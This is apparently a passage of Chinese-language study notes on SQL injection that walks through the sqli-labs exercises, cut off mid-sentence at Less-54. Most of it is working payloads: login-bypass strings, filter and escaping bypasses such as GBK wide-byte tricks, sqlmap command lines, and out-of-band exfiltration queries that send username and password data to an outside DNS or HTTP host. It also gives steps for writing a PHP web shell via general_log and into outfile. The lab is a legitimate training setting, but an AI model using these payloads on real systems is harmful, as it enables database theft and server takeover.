table_schema=database()and@:=concat(@,0xa,table_schema,0x3a3a,table_name,0x3a3a,column_name)),@)))x))) CTF demo\nhttps://whoamianony.top/2021/05/01/CTF%E6%AF%94%E8%B5%9B%E8%AE%B0%E5%BD%95/%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8%20MySQL%20exp()%20%E5%87%BD%E6%95%B0%E8%BF%9B%E8%A1%8C%20Sql%20%E6%B3%A8%E5%85%A5/\n注意点\n 需要嵌套才能报错回显的原因(个人理解)：\nmysql报错回显(几何函数、exp()等函数)一般报错返回的是列名相关，不嵌套就正常返回列名，比如\nselect version()； //其返回结果集的列名即为version()\r而在报错回显机制种，一旦嵌套就会详细返回列名中包含的执行语句(MySQL本身报错机制？？？)，比如\nselectexp(~(select*from(selectversion())x));ERROR1690(22003):DOUBLEvalueisoutofrangein\u0026#39;exp(~((select \u0026#39;5.5.29\u0026#39; from dual)))\u0026#39;//\u0026#34;select \u0026#39;5.5.29\u0026#39; from dual\u0026#34;即为列名 bool盲注 \u0026amp; 时间型盲注 盲注用在不知道数据库返回值的情况下对数据内容进行猜测\n 盲注适用场景：无法直接回显获取执行结果，只能根据返回状态判断\nbool型：返回 True 和 False 两种状态页面，根据页面返回不同，猜解数据\n时间型：通过注入能够造成延时的特定语句，根据页面的物理反馈，来判断是否注入成功，如：在 SQL 语句中使用 sleep() 函数看加载网页的时间来判断注入点\n 常用函数 编码转换函数 ord()、ascii() ：将字符转为ascii码\nchar()：将ascii码转为字符\n条件判断函数 if(exp1, exp2, exp3)\nselect case when username=\u0026ldquo;admin\u0026rdquo; then sleep(1) else \u0026ldquo;error\u0026rdquo; end from user\n截取函数 substr()\nubstr(str, pos, len) //从 pos 位置开始，截取字符串 str 的 len 长度\rsubstr(str from pos for length) //可以用在过滤了，的情况\rsubstring()\nsubstring(str, pos, len) //从 pos 位置开始，截取字符串 str 的 len 长度\rsubstring(str from pos for length) mid()\nmid(str, pos, length)\rmid(str from pos for length)\r注意点\n 以上含pos参数的函数中，pos从1开始\n left() \u0026amp; right()\nleft(str, len) right(str, len)\r正则表达式\nselect * from user where password rlike \u0026quot;^1\u0026quot;\rselect * from user where password REGEXP \u0026quot;^1\u0026quot;\rselect * from user where password REGEXP \u0026quot;^12\u0026quot;\r延时函数 sleep(n) //挂起n秒\rbenchmark(count, sha(1)) //实行sha(1)函数count次数，从而延时\rSELECT count(*) from information_schema.columns A, information_schema.columns B, information_schema.tables C; //笛卡尔积造成延时\rselect * from users where id =1 and IF(1,concat(rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a'),rpad(1,999999,'a')) RLIKE '(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+b',0) //用正则表达式匹配长字符制造延时\rrpad(string, length, rpad_string) //rpad()函数将一个字符串string用另一个字符串rpad_string在右侧填充到一定长度length\r其他函数 count()\rlength()\rsqlmap检测各类注入 //union注入\rsqlmap -u \u0026quot;http://127.0.0.1:8888/Less-1/?id=1\u0026quot; --dbms=MySQL --random-agent --flush-session --technique=U -v 3\r//显错注入\r--technique=E\r//bool盲注\r--technique=B\r//时间型盲注\r--technique=T\rOOB注入    类别 注入类型 说明     带内 报错、union 直接回显数据   间接推断 bool、时间盲注 非直接回显，根据状态间接判断   带外 OOB 通过其他信道获取数据    Out Of Band 带外通道技术(OOB)让攻击者能够利用其他信道获取非直接回显的漏洞。\n带外通道技术通常需要让目标来生成TCP/UDP/ICMP 请求并带有敏感数据，攻击者可以通过这接收和处理这个请求来提取想要的数据。\n前提：\n 防火墙允许出站  示意图：\n\r\nOOB注入利用原理 Windows中的UNC路径 比如Windows中访问共享文件时就会用到如下网络地址，这就是UNC路径：\n\\\\192.168.33.33\\haha\\\r要想带出数据还是要靠DNSLog。\nload_file函数是用来读取文件内容，读取成功会返回文件内容的字符串，失败返回null。\n利用方法：\nselect load_file(concat('\\\\\\\\',(select hex(concat_ws('~',username,password)) from users limit 0,1),'.xxx.ceye.io\\\\aa'))\r# 通过concat函数将查询结果与域名拼接形成UNC路径，调用load_file函数对UNC路径发起请求，因此成功发起DNS请求将数据外带\rload_file函数使用注意 该函数使用受 secure_file_priv 的限制，如果secure_file_priv 值为null或其他特定目录，则无法构造任意UNC路径进行利用\n大文本传输技巧 域名长度限制：\n 域名由标签组成，以 . 分割，标签的长度不可以超过 63 个字符 整个域名不可以超过 253 个字符，包括 .  绕过限制思路：\n load_file读取内容 substr对文本内容切片 to_base64对切片后的内容编码  selectconcat(to_base64(substr(load_file(\u0026#34;xxx\u0026#34;),1,10)),\u0026#34;.xxx.ceye.io\\\\a\u0026#34;)asresultOracle数据库利用OOB的技巧 Oracle 数据库中存在发起 HTTP 请求的函数 UTL_HTTP.request，它的返回类型是长度为 2000 或更短的字符串。\nUTL_HTTP.request(url, proxy)\r通过注入执行下列SQL语句：\nselect UTL_HTTP.request('http://ip/xxx.php'||'?id='||(select version from v$instance)) from dual;\r在xxx.php中接收id参数。\nSQL注入——命令执行  dumpfile函数写shell udf执行命令 sqlmap \u0026ndash;os-shell(本质还是webshell)  sqli-lab Less-1    拼接点 可用注入类型     SELECT * FROM users WHERE id='$id' LIMIT 0,1 UNION、显错、bool盲、延时盲    Less-2    拼接点 可用注入类型     SELECT * FROM users WHERE id=$id LIMIT 0,1 UNION、显错、bool盲、延时盲    与Less-1利用方式一致，闭合时候不同\nLess-3    拼接点 可用注入类型     SELECT * FROM users WHERE id=('$id') LIMIT 0,1 UNION、显错、bool盲、延时盲    与Less-1利用方式一致，闭合时候不同\nLess-4 $id = '\u0026quot;' . $id . '\u0026quot;';\r$sql=\u0026quot;SELECT * FROM users WHERE id=($id) LIMIT 0,1\u0026quot;;\r   拼接点 可用注入类型     双引号+单括号 UNION、显错、bool盲、延时盲    Less-5 $sql=\u0026quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1\u0026quot;;\rif true:\r打印 'You are in ...';\relse:\rprint_r(mysql_error());\r   拼接点 可用注入类型     单引号 显错、bool盲、延时盲    缺少回显机制，但可以依靠盲注和显错\nLess-6    拼接点 可用注入类型     双引号 显错、bool盲、延时盲    缺少回显机制，可以依靠盲注和显错\nLess-7 $sql=\u0026quot;SELECT * FROM users WHERE id=(('$id')) LIMIT 0,1\u0026quot;;\rif true:\r打印 'You are in.... Use outfile......';\relse:\r//print_r(mysql_error());\r   拼接点 可用注入类型     单引号+双括号 显错、bool盲、延时盲    缺少回显机制和报错机制，只能依靠盲注\ninto outfile 写敏感信息 前提是要知道网站根目录路径，确保写入后可以访问到\n\rimage\r\n 一开始是写不进去，因为网站用户对根目录下没有写权限，尝试更改权限后成功写入\n 写shell \rimage\r\nLess-8    拼接点 可用注入类型     单引号 bool盲、延时盲    同Less-7\nLess-9 $sql=\u0026quot;SELECT * FROM users WHERE id='$id' LIMIT 0,1\u0026quot;;\rif true:\r打印 'You are in....';\relse:\r打印 'You are in....';\r   拼接点 可用注入类型     单引号 延时盲    无论true或false，全都打印同一字符串，无法bool盲注，只能延时盲注\nLess-10    拼接点 可用注入类型     双引号 延时盲    同Less-9\nLess-11 $uname=$_POST['uname'];\r$passwd=$_POST['passwd'];\r@$sql=\u0026quot;SELECT username, password FROM users WHERE username='$uname' and password='$passwd' LIMIT 0,1\u0026quot;;\rif true:\r打印结果\relse:\rprint_r(mysql_error());\r   拼接点 可用注入类型     POST-单引号 UNION、显错、bool盲、延时盲    万能密码 uname=admin'--+\u0026amp;passwd=\runame=admin'#\u0026amp;passwd=\runame=admin\u0026amp;passwd=1' or 1--+\u0026amp;submit=Submit\runame=admin\u0026amp;passwd=1'||1--+\u0026amp;submit=Submit\runame=admin\u0026amp;passwd=1' or 1#\u0026amp;submit=Submit\runame=admin\u0026amp;passwd=1'||1#\u0026amp;submit=Submit\runame=admin\u0026amp;passwd=1'or'1'='1\u0026amp;submit=Submit\runame=admin\u0026amp;passwd=1'||'1'='1\u0026amp;submit=Submit\r注意 POST注入最好走bp\nLess-12    拼接点 可用注入类型     POST-双引号+单括号 UNION、显错、bool盲、延时盲    与Less-11一致\nLess-13    拼接点 可用注入类型     POST-单引号+单括号 显错、bool盲、延时盲    不回显查询结果，除了union其他都可\nLess-14    拼接点 可用注入类型     POST-双引号 显错、bool盲、延时盲    不回显查询结果，除了union其他都可\nLess-15    拼接点 可用注入类型     POST-单引号 bool盲、延时盲    不回显查询结果，不报错\nLess-16    拼接点 可用注入类型     POST-双引号+单括号 bool盲、延时盲    不回显查询结果，不报错\nLess-17 $uname=check_input($_POST[\u0026#39;uname\u0026#39;]); $passwd=$_POST[\u0026#39;passwd\u0026#39;]; @$sql=\u0026#34;SELECT username, password FROM users WHERE username= $unameLIMIT 0,1\u0026#34;; if select 语句有结果： $update=\u0026#34;UPDATE users SET password = \u0026#39;$passwd\u0026#39; WHERE username=\u0026#39;$uname\u0026#39;\u0026#34;; if mysql报错： print_r(mysql_error());    拼接点 可用注入类型     POST-单括号 显错、bool盲、延时盲    uname参数被过滤，只能考虑给一个正确的uname值进入分支，对update语句进行注入\n无数据回显\nLess-18 $uagent = $_SERVER[\u0026#39;HTTP_USER_AGENT\u0026#39;]; $IP = $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]; $uname = check_input($_POST[\u0026#39;uname\u0026#39;]); $passwd = check_input($_POST[\u0026#39;passwd\u0026#39;]); $sql=\u0026#34;SELECT users.username, users.password FROM users WHERE users.username=$unameand users.password=$passwdORDER BY users.id DESC LIMIT 0,1\u0026#34;; if select 语句有结果： $insert=\u0026#34;INSERT INTO `security`.`uagents` (`uagent`, `ip_address`, `username`) VALUES (\u0026#39;$uagent\u0026#39;, \u0026#39;$IP\u0026#39;, $uname)\u0026#34;; 输出 $uagent; print_r(mysql_error()); else: print_r(mysql_error());    拼接点 可用注入类型     POST-单括号 显错、bool盲、延时盲    该注入类型为insert注入，首先需要给一个正确的用户名、密码进入分析，对insert语句进行注入\ninsert注入必须要闭合后面语句\n如下：\n' and updatexml(1,concat(0x7e,(select user()),0x7e),1) and '1'='1\r' and updatexml(1,concat(0x7e,(select user()),0x7e),1),\u0026quot;1\u0026quot;,\u0026quot;1\u0026quot;)--+\rLess-19    拼接点 可用注入类型     POST-单括号 显错、bool盲、延时盲    类似18，注入点在referer头\nLess-20 if cookie中没有uname参数：\r输出登录信息;\rif 提交uname和passwd：\r$uname = check_input($_POST['uname']);\r$passwd = check_input($_POST['passwd']);\r$sql=\u0026quot;SELECT users.username, users.password FROM users WHERE users.username=$uname and users.password=$passwd ORDER BY users.id DESC LIMIT 0,1\u0026quot;;\r$cookee = $row1['username'];\rif 有返回结果:\rsetcookie('uname', $cookee, time()+3600);\relse:\rprint_r(mysql_error());\relse:\rif 没有提交submit参数：\r$cookee = $_COOKIE['uname'];\r$sql=\u0026quot;SELECT * FROM users WHERE username='$cookee' LIMIT 0,1\u0026quot;;\rif 没有返回结果:\r输出 mysql_error();\rif 有返回结果:\r回显查询结果;\relse:\rsetcookie('uname', $row1['username'], time()-3600); //通过把失效日期设置为过去的日期/时间，删除一个 cookie\r   拼接点 可用注入类型     POST-单括号 UNION、显错、bool盲、延时盲    cookie中uname参数没有过滤，有数据回显、有报错\nsqlmap 带cookie注入用法 //UINION 其中 “-p 参数” 表示要测试的参数，这时--level失效；也可以使用'*'去标记参数\rsqlmap -u \u0026quot;http://127.0.0.1:8888/Less-20/\u0026quot; --cookie=\u0026quot;uname=admin\u0026quot; -p \u0026quot;cookie\u0026quot; --dbms=MySQL --random-agent --flush-session --technique=U -v 3\rLess-21 代码逻辑和Less-20类似，只不过获取set cookie时用了base64编码，获取cookie值时再解码拼入sql语句\n   拼接点 可用注入类型     POST-单括号+单括号 UNION、显错、bool盲、延时盲    Less-22 类似Less-21\n   拼接点 可用注入类型     POST-双引号 UNION、显错、bool盲、延时盲    Less-23 $id=$_GET[\u0026#39;id\u0026#39;]; //过滤了注释符 $reg = \u0026#34;/#/\u0026#34;; $reg1 = \u0026#34;/--/\u0026#34;; $replace = \u0026#34;\u0026#34;; $id = preg_replace($reg, $replace, $id); $id = preg_replace($reg1, $replace, $id);    拼接点 可用注入类型     单引号 UNION、显错、bool盲、延时盲    过滤注释后，就需要闭合原始sql语句\n注意\n UNION 注入使用from，在闭合原始语句时候需要引入where保证sql语句语法正确，例如：\n-1' union select 1,group_concat(username,':',password),3 from security.users where 1 and \u0026lsquo;1\u0026rsquo; = \u0026lsquo;1\n Less-24(二次注入) login_create.php\n$username= mysql_escape_string($_POST['username']) ;\r$pass= mysql_escape_string($_POST['password']);\r$re_pass= mysql_escape_string($_POST['re_password']);\r$sql = \u0026quot;select count(*) from users where username='$username'\u0026quot;;\rif 查询结果不为0：\r表明有用户存在，不可注册；\relse:\rif 两次输入密码一致：\r$sql = \u0026quot;insert into users ( username, password) values(\\\u0026quot;$username\\\u0026quot;, \\\u0026quot;$pass\\\u0026quot;)\u0026quot;;\r重定向到登录页面；\relse:\r提示输入不一致；\rlogin.php\n $username = mysql_real_escape_string($_POST[\u0026quot;login_user\u0026quot;]);\r$password = mysql_real_escape_string($_POST[\u0026quot;login_password\u0026quot;]);\r$sql = \u0026quot;SELECT * FROM users WHERE username='$username' and password='$password'\u0026quot;;\rif 查询有结果：\r$_SESSION[\u0026quot;username\u0026quot;] = 结果中的username值; //在session中设置username参数\r重定向到已登录界面；\rpass_change.php\nif 未登录：\r重定向到首页；\r$username= $_SESSION[\u0026quot;username\u0026quot;]; //从session中取出useranme值\r$curr_pass= mysql_real_escape_string($_POST['current_password']);\r$pass= mysql_real_escape_string($_POST['password']);\r$re_pass= mysql_real_escape_string($_POST['re_password']);\rif 两次密码输入一致：\r$sql = \u0026quot;UPDATE users SET PASSWORD='$pass' where username='$username' and password='$curr_pass' \u0026quot;;\rif 执行成功：\r输出成功更新密码；\relse:\r重定向到错误页面；\r分析 可看到基本上可进行直接注入的常规点都被转义过滤了，但是登录成功后，会从数据库中查询useranme值放入session；随后在pass_change页面更新密码语句存在注入点，且数据来源于从session取出来的值，也就是未过滤的值，因此存在二次注入\n利用 注册用户名为 admin’#\n登录之后随意填入当前密码，再填入修改后的密码，提交即可任意修改admin用户密码\nLess-25 $id= preg_replace(\u0026#39;/or/i\u0026#39;,\u0026#34;\u0026#34;, $id); $id= preg_replace(\u0026#39;/AND/i\u0026#39;,\u0026#34;\u0026#34;, $id); $sql=\u0026#34;SELECT * FROM users WHERE id=\u0026#39;$id\u0026#39; LIMIT 0,1\u0026#34;;    拼接点 可用注入类型     单引号 UNION、显错、bool盲、延时盲    绕过 双写\nor -\u0026gt; ||\nand -\u0026gt; \u0026amp;\u0026amp;(get型中要url编码，否则歧义)\nLess-25a    拼接点 可用注入类型     直接拼 UNION、bool盲、延时盲    与Less-25一致，拼接方式不同，不能报错\nLess-26 $id= preg_replace(\u0026#39;/or/i\u0026#39;,\u0026#34;\u0026#34;, $id);\t//strip out OR (non case sensitive) $id= preg_replace(\u0026#39;/and/i\u0026#39;,\u0026#34;\u0026#34;, $id);\t//Strip out AND (non case sensitive) $id= preg_replace(\u0026#39;/[\\/\\*]/\u0026#39;,\u0026#34;\u0026#34;, $id);\t//strip out /* $id= preg_replace(\u0026#39;/[--]/\u0026#39;,\u0026#34;\u0026#34;, $id);\t//Strip out -- $id= preg_replace(\u0026#39;/[#]/\u0026#39;,\u0026#34;\u0026#34;, $id);\t//Strip out # $id= preg_replace(\u0026#39;/[\\s]/\u0026#39;,\u0026#34;\u0026#34;, $id);\t//Strip out spaces $id= preg_replace(\u0026#39;/[\\/\\\\\\\\]/\u0026#39;,\u0026#34;\u0026#34;, $id); //Strip out slashes    拼接点 可用注入类型     单引号 UNION、显错、bool盲、延时盲    绕过 针对空白符，可用如下方式替换绕过，本次使用/\\s/匹配，所以用%0b和%a0才可绕过\n   符号 说明     %09 TAB 键(水平)   %0a 新建一行   %0c 新的一页   %0d return 功能   %0b TAB 键(垂直)   %a0 空格    Less-26a    拼接点 可用注入类型     单引号+单括号 UNION、bool盲、延时盲    与Less-26一致，拼接方式不同，不能报错\nLess-27 $id= preg_replace(\u0026#39;/[\\/\\*]/\u0026#39;,\u0026#34;\u0026#34;, $id);\t//strip out /* $id= preg_replace(\u0026#39;/[--]/\u0026#39;,\u0026#34;\u0026#34;, $id);\t//Strip out --. $id= preg_replace(\u0026#39;/[#]/\u0026#39;,\u0026#34;\u0026#34;, $id);\t//Strip out #. $id= preg_replace(\u0026#39;/[ +]/\u0026#39;,\u0026#34;\u0026#34;, $id);\t//Strip out spaces. $id= preg_replace(\u0026#39;/select/m\u0026#39;,\u0026#34;\u0026#34;, $id);\t//Strip out spaces. $id= preg_replace(\u0026#39;/[ +]/\u0026#39;,\u0026#34;\u0026#34;, $id);\t//Strip out spaces. $id= preg_replace(\u0026#39;/union/s\u0026#39;,\u0026#34;\u0026#34;, $id);\t//Strip out union $id= preg_replace(\u0026#39;/select/s\u0026#39;,\u0026#34;\u0026#34;, $id);\t//Strip out select $id= preg_replace(\u0026#39;/UNION/s\u0026#39;,\u0026#34;\u0026#34;, $id);\t//Strip out UNION $id= preg_replace(\u0026#39;/SELECT/s\u0026#39;,\u0026#34;\u0026#34;, $id);\t//Strip out SELECT $id= preg_replace(\u0026#39;/Union/s\u0026#39;,\u0026#34;\u0026#34;, $id);\t//Strip out Union $id= preg_replace(\u0026#39;/Select/s\u0026#39;,\u0026#34;\u0026#34;, $id);\t//Strip out select    拼接点 可用注入类型     单引号 UNION、显错、bool盲、延时盲    绕过 本次只是简单过滤了空格，而不是空白符，所以%0a即可绕过空格限制\nunioN\nunIon\nseLEct\n等等\nLess-27a    拼接点 可用注入类型     双引号 UNION、bool盲、延时盲    与Less-27一致，没有显错\nLess-28 $id= preg_replace(\u0026#39;/[\\/\\*]/\u0026#39;,\u0026#34;\u0026#34;, $id);\t//strip out /* $id= preg_replace(\u0026#39;/[--]/\u0026#39;,\u0026#34;\u0026#34;, $id);\t//Strip out --. $id= preg_replace(\u0026#39;/[#]/\u0026#39;,\u0026#34;\u0026#34;, $id);\t//Strip out #. $id= preg_replace(\u0026#39;/[ +]/\u0026#39;,\u0026#34;\u0026#34;, $id);\t//Strip out spaces. $id= preg_replace(\u0026#39;/[ +]/\u0026#39;,\u0026#34;\u0026#34;, $id);\t//Strip out spaces. $id= preg_replace(\u0026#39;/union\\s+select/i\u0026#39;,\u0026#34;\u0026#34;, $id);\t//Strip out UNION \u0026amp; SELECT.    拼接点 可用注入类型     单引号+单括号 UNION、bool盲、延时盲    过滤了union空白符select，可双写绕过，可替换空白符为%0b或%a0绕过\nLess-28a    拼接点 可用注入类型     单引号+单括号 UNION、bool盲、延时盲    少了几个过滤规则，其余和Less-28一致\nLess-29 index.php // 可以不用管，作者误放了应该\n普通可注入页面\rlogin.php\n$qs = $_SERVER[\u0026#39;QUERY_STRING\u0026#39;]; $id1=java_implimentation($qs); $id=$_GET[\u0026#39;id\u0026#39;]; whitelist($id1); $sql=\u0026#34;SELECT * FROM users WHERE id=\u0026#39;$id\u0026#39; LIMIT 0,1\u0026#34;; function whitelist($input) { # 匹配数字 \t$match = preg_match(\u0026#34;/^\\d+$/\u0026#34;, $input); if 不是数字： 重定向到失败页面; } # HTTP 参数污染 function java_implimentation($query_string) { $q_s = $query_string; # 以\u0026#39;\u0026amp;\u0026#39;为分隔符分割字符串 \t$qs_array= explode(\u0026#34;\u0026amp;\u0026#34;,$q_s); # 遍历分割好的参数数组 \tforeach($qs_array as $key =\u0026gt; $value) { $val=substr($value,0,2); # 如果前两位是id \tif($val==\u0026#34;id\u0026#34;) { # 从第3位开始，返回长度为30的字符穿 \t$id_value=substr($value,3,30); return $id_value; break; } } }    拼接点 可用注入类型     单引号 UNION、显错、bool盲、延时盲    分析 流程：服务端获取到查询字符串id=1\u0026amp;...，随后截取参数id的值用于白名单过滤，如果匹配数字则继续执行，否则重定向到失败页面\n但是问题出在以下：\n 用于sql查询的id值是通过GET方式获取的，该服务端默认认为从GET方式获取的id值与用于解析白名单过滤的id值是同一个 对于xxx.php?id=1\u0026amp;id=2这样的同名参数污染，apache PHP会解析获取最后一个参数值，即为2；tomcat JSP会解析获取到第一个参数值，即为1  因此，利用方式如下：?id=1\u0026amp;id=-1\u0026rsquo; union\u0026hellip;..\nLess-30    拼接点 可用注入类型     双引号 UNION、显错、bool盲、延时盲    与Less-29一致\nLess-31    拼接点 可用注入类型     双引号+单括号 UNION、显错、bool盲、延时盲    与Less-29一致\nLess-32 function check_addslashes($string) { # 转义\\  $string = preg_replace(\u0026#39;/\u0026#39;. preg_quote(\u0026#39;\\\\\u0026#39;) .\u0026#39;/\u0026#39;, \u0026#34;\\\\\\\\\\\\\u0026#34;, $string); # 转义单引号  $string = preg_replace(\u0026#39;/\\\u0026#39;/i\u0026#39;, \u0026#39;\\\\\\\u0026#39;\u0026#39;, $string); # 转义双引号  $string = preg_replace(\u0026#39;/\\\u0026#34;/\u0026#39;, \u0026#34;\\\\\\\u0026#34;\u0026#34;, $string); return $string; } $id=check_addslashes($_GET[\u0026#39;id\u0026#39;]); mysql_query(\u0026#34;SET NAMES gbk\u0026#34;); $sql=\u0026#34;SELECT * FROM users WHERE id=\u0026#39;$id\u0026#39; LIMIT 0,1\u0026#34;;    拼接点 可用注入类型     单引号 UNION、显错、bool盲、延时盲    绕过 使用 GBK 编码MySQL会认为两个字节为一个汉字，例如 %aa%5e 即为一个 汉字\n由于转义是在敏感字符前加\\，\\'即%5c%27，那可以在\\'前加上%df，转义后结果为：%df\\\\\\'，这样MySQL使用GBK会认为%df%5c为一个汉字，即为汉字\\\\'，则汉字后的两个反斜杠实际在送往sql语句时表示的仅仅只是一个单纯的反斜杠，不再具有转义作用，此时单引号便起到了闭合作用\nLess-33 function check_addslashes($string) { $string= addslashes($string); return $string; } 转义方法与Less-32类似\n   拼接点 可用注入类型     单引号 UNION、显错、bool盲、延时盲    绕过方式与Less-32一致\n补充 gbk编码造成的宽字符注入问题，解决方法是设置character_set_client=binary\n原理\nMySQL编码机制\nmysql_query(\u0026#34;SET character_set_connection=gbk,character_set_results=gbk,character_set_client=binary\u0026#34;, $conn); character_set_client：用户告诉MySQL查询是用的什么字符集。 character_set_connection：MySQL接收到用户查询后，按照character_set_client将其转化为character_set_connection设定的字符集 character_set_results：MySQL将存储的数据转换成character_set_results所设定的字符集发送给用户\n完整可理解为：MySQL接受到客户端的数据后，会认为他的编码是character_set_client，然后会将换成character_set_connection的编码，然后在进入具体表和字段后，再转换成字段对应的编码，当查询结果产生后，会从表和字段编码转换成character_set_results编码，返回给客户端\nLess-34    拼接点 可用注入类型     POST-单引号 UNION、显错、bool盲、延时盲    与Less-33类似\nLess-35 $id=check_addslashes($_GET[\u0026#39;id\u0026#39;]); function check_addslashes($string) { $string = addslashes($string); return $string; } $sql=\u0026#34;SELECT * FROM users WHERE id=$idLIMIT 0,1\u0026#34;;    拼接点 可用注入类型     直接拼接 UNION、显错、bool盲、延时盲    虽然有转义过滤，但是sql语句是直接拼接，所以不需要引号闭合等\nLess-36 function check_quotes($string) { $string= mysql_real_escape_string($string); return $string; }    拼接点 可用注入类型     单引号 UNION、显错、bool盲、延时盲    与Less-33的过滤方式类似，绕过方法类似\nLess-37    拼接点 可用注入类型     POST-单引号 UNION、显错、bool盲、延时盲    与Less-36类似\nLess-38(堆叠注入) 堆叠 多条语句一起执行\n原理 MySQL 中，主要是命令行中，每条语句结尾加 ; 表示语句结束。这样可以考虑闭合已有语句，从而执行多条 SQL 语句\n注意\n UNION 执行的语句类型是有限的—查询语句；而堆叠注入可以执行任意语句\n并不是每一个环境下都可以执行堆叠，很可能受 API 、数据库引擎不支持、权限不足的限制\n在真实环境中通常只返回一个查询结果，因此，堆叠注入第二个语句可能产生错误或者结果被忽略，即在前端界面是无法看到返回结果的；在使用堆叠注入之前需要知道一些数据库相关信息的，例如表名，列名等信息\n if (mysqli_multi_query($con1, $sql)) // 执行多个查询有结果 { /* store first result set */ if ($result = mysqli_store_result($con1)) { if($row = mysqli_fetch_row($result)) { echo \u0026#39;\u0026lt;font size = \u0026#34;5\u0026#34; color= \u0026#34;#00FF00\u0026#34;\u0026gt;\u0026#39;;\tprintf(\u0026#34;Your Username is : %s\u0026#34;, $row[1]); echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; printf(\u0026#34;Your Password is : %s\u0026#34;, $row[2]); echo \u0026#34;\u0026lt;br\u0026gt;\u0026#34;; echo \u0026#34;\u0026lt;/font\u0026gt;\u0026#34;; } // mysqli_free_result($result);  } /* print divider */ if (mysqli_more_results($con1)) // 是否有更多结果  { //printf(\u0026#34;-----------------\\n\u0026#34;);  } //while (mysqli_next_result($con1)); }    拼接点 可用注入类型     单引号 UNION、显错、bool盲、延时盲、堆叠    后续利用 堆叠注入可以执行任意SQL语句，那么就可以进行开启日志getshell\n前提：\n 有web目录的物理路径 MySQL用户可以对web目录有读写权限  payload：\nid=1';set global general_log = \u0026quot;On\u0026quot;;set global general_log_file='/var/www/html/shell.php';--+\rid=1';select \u0026lt;?php phpinfo(); ?\u0026gt;;--+\r访问shell.php即可\n 本题开启日志getshell尝试过程中，发现set global general_log_file='/var/www/html/shell.php'一直执行失败，原因是：/var/目录不属于mysql用户，无法设置成功，进入容器修改目录权限即可执行成功\n Less-39    拼接点 可用注入类型     直接拼 UNION、显错、bool盲、延时盲、堆叠    与Less-38类似\nLess-40 拼接方式：单引号 + 括号\n其余与Less-38类似\nLess-41 拼接方式：直接拼\n注入类型：无法报错注入\n其余与Less-39类似\nLess-42 login.php:\n$username = mysqli_real_escape_string($con1, $_POST[\u0026#34;login_user\u0026#34;]); $password = $_POST[\u0026#34;login_password\u0026#34;]; $sql = \u0026#34;SELECT * FROM users WHERE username=\u0026#39;$username\u0026#39; and password=\u0026#39;$password\u0026#39;\u0026#34;; mysqli_multi_query($con1, $sql)) if 查询成功： return $row[1]; else: print_r(mysqli_error($con1)); if 登录成功: setcookie(\u0026#34;Auth\u0026#34;, 1, time()+3600); 跳转到 logged-in.php logged-in.php:\n提供修改密码功能\npass_change.php：\nif 未登录: 重定向 index.php if 修改密码表单: $username = $_SESSION[\u0026#34;username\u0026#34;]; $curr_pass = mysql_real_escape_string($_POST[\u0026#39;current_password\u0026#39;]); $pass = mysql_real_escape_string($_POST[\u0026#39;password\u0026#39;]); $re_pass = mysql_real_escape_string($_POST[\u0026#39;re_password\u0026#39;]); if $pass == $re_pass: $sql = \u0026#34;UPDATE users SET PASSWORD=\u0026#39;$pass\u0026#39; where username=\u0026#39;$username\u0026#39; and password=\u0026#39;$curr_pass\u0026#39; \u0026#34;; 分析 第一处漏洞发生在登录时的password未过滤，可进行报错、堆叠、union等注入\n第二处漏洞发生在update更新密码时对从session中获得的用户名未做过滤，利用方式与Less-24类似\nLess-43 拼接方式：POST + 单引号 + 但括号\n其余与Less-42类似\nLess-44 拼接方式：单引号\n注入类型：少了报错\n其余与Less-43类似\nLess-45 注入类型：少了报错\n其余与Less-43类似\nLess-46 $id=$_GET[\u0026#39;sort\u0026#39;]; $sql = \u0026#34;SELECT * FROM users ORDER BY $id\u0026#34;; if 查询成功： 输出查询结果 else： print_r(mysql_error()); 注入位置发生在order by 子句上\n探测方式 更换id发现排序方式不同，可能是用不同的列进行排序\n升降 # 升序\r?sort=1 asc\r# 降序\r?sort=1 desc\rrand()函数 ?sort=rand(true)\r?sort=rand(false)\r二者返回结果不一样，且是固定的，因此可进行布尔、延时盲注\n延时探测 ?sort=sleep(1)\r?sort=(sleep(1))\r?sort=1 and sleep(1)\r返回时间为查询结果行数 * 1 秒\n利用 报错 ?sort=1+AND+(SELECT+1+FROM+(SELECT+COUNT(*),CONCAT((SELECT(SELECT+CONCAT(CAST(CONCAT(username,password)+AS+CHAR),0x7e))+FROM+users+LIMIT+0,1),FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.TABLES+GROUP+BY+x)a)\r# 利用procedure analyse 参数报错\r?sort=1 procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)\r盲注 ?sort=rand(left(database(),1)='s')\r# 延时\r?sort=rand(if(ascii(substr(database(),1,1))=115,1,sleep(1)))\rinto outfile 直接导出(注意需要有写权限)：\n?sort=1 into outfile \u0026quot;/var/www/html/less46.txt\u0026quot;\rgetshell：\n?sort=1 into outfile \u0026quot;/var/www/html/shell.php\u0026quot; lines terminated by 0x3c3f70687020706870696e666f28293b3f3e\r限定每一行以0x3c3f70687020706870696e666f28293b3f3e(\u0026lt;?php phpinfo();?\u0026gt;的十六进制编码)为结尾\n\r\nLess-47 拼接方式：单引号\n其余与Less-46类似\nLess-48 注入类型：少了报错\n其余与Less-46类似\nLess-49 注入类型：少了报错\n其余与Less-47类似\nLess-50 注入类型：可以堆叠注入\n其余与Less-46类似\nLess-51-53 与Less50类似，只是在在注入类型和拼接方式上有变化\nLess-54 index.php：\nif $_GET['id']:\r计数器加1；\rif 计数器超过10次：\r提示失败\r$sql=\u0026quot;SELECT * FROM security.users WHERE id='$id' LIMIT 0,1\u0026quot;;\rif 有查询成功:\r输出查询信息\relse：\rpass\r$key = addslashes($_POST['key']);\r$key = mysql_real_escape_string($key);\r$sql=\u0026quot;SELECT 1 FROM $table WHERE $col1= '$key'\u0026quot;;\r要求从challenges数据库中10次得到secret key\n利用 判断闭合：\n?id=1' --+\r可用union注入\r判断字段数目：\n?id=1' order by 3--+\r?id=1' order by 